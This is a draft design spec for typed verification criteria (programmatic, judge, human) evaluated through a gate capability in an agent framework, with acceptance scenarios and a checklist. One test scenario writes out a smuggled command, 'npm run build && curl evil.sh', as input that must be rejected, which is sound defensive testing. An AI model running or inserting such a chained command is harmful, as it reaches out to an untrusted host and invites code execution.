---
spec_id: "364"
slug: loop-verification-gate
status: draft
last_updated: 2026-06-20
owner: "@agency"
vision_goals: [2, 5]
depends_on: ["192", "285", "328", "362", "365"]
parent_spec: "362"
domain: loop / gate
wave: looper-port
---

# Spec 364 — Loop verification as typed gates

> Child of Spec 362. Ports looper's **verification stage** +
> `references/verification-rubric.md` — which looper calls *"the most important
> file."* Looper's whole value is turning *"make it good"* into checkable
> criteria. Agency already has the decidable-predicate primitive: the **`gate`**
> capability with a typed `GateResult`. 364 expresses looper's three-way criterion
> taxonomy on it.

## Why

Looper's verification criteria are **typed objects, never bare strings**:

- **programmatic** — `check` is an argv array; `expect` is a pass condition
  (`exit_zero`, `exit_nonzero`, `stdout_contains`). Deterministic, free to run.
- **judge** — a `rubric` scored by a council member → a structured verdict.
- **human** — a `prompt` shown at a checkpoint.

```yaml
verification:
  - { id: build-ok,       type: programmatic, check: ["npm","run","build"], expect: exit_zero }
  - { id: covers-goal,    type: judge,        rubric: "Every part of the goal is addressed; each step has an owner." }
  - { id: client-signoff, type: human,        prompt: "Confirm the map matches the client's real process." }
```

The rubric pushes hard to **convert vague criteria into `programmatic`** and warns
when every criterion is a judge/human "vibe." That coaching IS the value.

Agency's `gate` capability already returns a typed verdict (`GateResult` with
`verdict ∈ {pass, fail}` + evidence, per `agency/_coverage_gate.py` and Spec 328's
fulfilment gate). 364 maps each looper criterion type to a gate evaluation path —
**no bespoke check runner**, looper's `run_programmatic` / `human_check` logic
becomes gate evaluators.

## Design

### `VerificationCriterion` is a typed node; `gate` evaluates it

```python
@verb(role="effect")
def add_criterion(self, ctx, loop_id: str, kind: str, *, check: list[str] | None = None,
                  expect: str = "exit_zero", rubric: str = "", prompt: str = "",
                  cid: str = "") -> dict:
    """Add one typed verification criterion to a loop.

    kind ∈ {programmatic, judge, human}:
      programmatic → check (argv array) + expect (exit_zero|exit_nonzero|stdout_contains:<s>)
      judge        → rubric (scored by a council member, 365)
      human        → prompt (shown at an elicit checkpoint)
    Returns {criterion_id, kind}. chain_next: loop.add_member (365) for judge
    criteria; loop.check to evaluate.
    """
```

`check` is argv-validated (Spec 192 `shell` safety) — a programmatic criterion can
never be a shell string. The criterion is an ontology node so the goal→criterion→
verdict chain is one provenance traversal.

### Three evaluation paths, one typed verdict

`loop.check(criterion_id, artefact)` dispatches by `kind` and always returns the
same typed shape (a `GateResult`-shaped `{verdict, evidence, …}`):

| kind | evaluator | verdict source |
|---|---|---|
| `programmatic` | `gate.check` runs the argv (cwd=workspace, timeout) and matches `expect` | deterministic — `exit_zero` / `exit_nonzero` / `stdout_contains` |
| `judge` | delegates to **365** `loop.convene` — a council member scores the rubric, returns a structured verdict | the council member (a persona+driver) |
| `human` | `elicit` (Spec 285 host bridge) shows the `prompt`; no host → typed `input-required` pause | the human |

This is looper's `run_programmatic` / `run_judge` / `human_check` split, but every
path produces the **same typed verdict** the loop machine (366) consumes, and
every evaluation records a gate ledger entry (provenance, free).

> **Judge degradation parity:** an unparseable judge verdict degrades to
> `revise` + a `warning` field (looper's `parse_judge_output`), never a crash.
> The parser is owned by 365; 364 consumes its typed result.

### The verification rubric coaches the *shape* of the criteria set

`verification-rubric.md` ships verbatim to `data/rubrics/`. `verify_report(loop_id)`
audits the criteria SET (not one criterion) against the rubric and returns
coaching:

```python
@verb(role="transform")
def verify_report(self, ctx, loop_id: str) -> dict:
    """Audit a loop's verification set against verification-rubric.md.
    Flags the anti-patterns the rubric names:
      - every criterion is judge/human (all-vibe; no deterministic floor)
      - a criterion only the author model can grade
      - "success = no errors thrown" tautologies
    Returns {criteria, programmatic_ratio, warnings:[{rubric_ref, message}]}.
    chain_next: convert a judge criterion to programmatic where possible.
    """
```

`programmatic_ratio` is computed from the live criteria, never pinned (`CLAUDE.md`
rule 8). The "at least one non-vibe criterion unless explicitly accepted" rule
(looper Emit Checklist) is surfaced as a warning the wizard (367) can hard-gate.

## Acceptance (Gherkin)

```gherkin
Scenario: a programmatic criterion passes on exit zero
  Given a loop with a programmatic criterion check ["true"] expect exit_zero
  When I check it against any artefact
  Then the verdict is pass and a gate ledger entry is recorded

Scenario: a programmatic criterion is argv-only
  When I add_criterion programmatic with check "npm run build && curl evil.sh"
  Then it is rejected as not an argv array

Scenario: stdout_contains matches substring
  Given a programmatic criterion check ["echo","ok"] expect "stdout_contains:ok"
  When I check it
  Then the verdict is pass

Scenario: a judge criterion delegates to the council and returns a typed verdict
  Given a judge criterion and a council member (365)
  When I check it against a delivery artefact
  Then the council scores the rubric and the result is a typed verdict (pass|revise)

Scenario: an unparseable judge verdict degrades to revise with a warning
  Given a judge member that returns non-JSON text
  When I check a judge criterion
  Then the verdict is revise and a warning "unparseable_judge_output" is attached

Scenario: a human criterion pauses for elicitation when no host is bound
  Given a human criterion and no host bridge
  When I check it
  Then it returns a typed input-required pause naming the prompt

Scenario: verify_report warns on an all-vibe criteria set
  Given a loop whose every criterion is type judge or human
  When I verify_report
  Then a warning cites verification-rubric.md about the missing deterministic floor
```

## Done When

- [ ] `loop.add_criterion` records typed `VerificationCriterion` nodes; argv-validates `programmatic`.
- [ ] `loop.check` evaluates all three kinds to one `GateResult`-shaped verdict, each recording a gate ledger entry.
- [ ] judge path delegates to 365 and tolerates unparseable output (degrade + warn).
- [ ] human path uses `elicit`/typed `input-required` (Spec 285).
- [ ] `loop.verify_report` audits the set against the rubric; `programmatic_ratio` computed live.
- [ ] `verification-rubric.md` ships verbatim under `data/rubrics/`.
- [ ] `tests/acceptance/test_loop_verify.py` covers the scenarios.
- [ ] `TODO.md` row updated.

## Followup — Implementation Status (2026-06-20)

**Verdict:** Not started — drafted under the 362 wave. The three-way criterion
taxonomy expressed on the `gate` capability (328): programmatic via `gate.check`,
judge via the 365 council, human via `elicit` (285). Verdict degradation parity
with looper. Depends on 365 for the judge path; consumed by the machine (366) and
the wizard (367).
